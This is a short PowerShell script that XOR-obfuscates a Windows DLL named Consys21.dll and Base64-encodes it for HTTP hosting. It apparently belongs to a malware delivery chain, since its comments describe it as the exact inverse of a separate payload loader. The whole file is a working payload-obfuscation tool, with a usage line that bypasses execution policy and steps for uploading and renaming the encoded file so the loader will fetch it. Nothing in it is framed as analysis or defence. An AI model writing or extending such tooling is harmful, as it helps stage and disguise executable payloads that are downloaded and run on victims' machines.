# Encrypt-Payload.ps1
# Payload encryptor: transforms a plaintext PE (Consys21.dll) into
# Base64( XOR(PE) ) text for HTTP distribution. Strict inverse of the loader
# DecodePayload() in PayloadLoader.cpp.
#
# Usage:
#   powershell -NoProfile -ExecutionPolicy Bypass -File Encrypt-Payload.ps1 `
#       -In  C:\path\to\Consys21.dll -Out C:\path\to\Consys21.enc
# Upload the produced .enc to the HTTP server and rename it to the URL the
# loader requests (e.g. Consys21.dll). The loader detects the format by content
# (MZ header vs Base64), the file extension does not matter.
param(
    [Parameter(Mandatory=$true, Position=0)][string]$In,
    [Parameter(Position=1)][string]$Out
)
$ErrorActionPreference = 'Stop'
$inPath = (Resolve-Path -LiteralPath $In).Path
if (-not $Out) { $Out = [IO.Path]::ChangeExtension($inPath, '.enc') }

$data = [IO.File]::ReadAllBytes($inPath)

# XOR: p = (byte)1024 % 1451 + 61 = 61
$p = [byte]61
for ($i = 0; $i -lt $data.Length; $i++) {
    # offline encrypt = original DecryptData transform: c = (x - p) ^ p
    $sub = [byte](($data[$i] - $p) -band 0xFF)
    $data[$i] = [byte]($sub -bxor $p)
}

# Single-line standard Base64 (with '=' padding); the loader tolerates CRLF too.
$b64 = [Convert]::ToBase64String($data)
[IO.File]::WriteAllText($Out, $b64, (New-Object System.Text.ASCIIEncoding))

$inLen = (Get-Item -LiteralPath $inPath).Length
$outLen = (Get-Item -LiteralPath $Out).Length
Write-Host ("[OK] {0} ({1:N0} bytes PE) -> {2} ({3:N0} bytes text)" -f $inPath,$inLen,$Out,$outLen)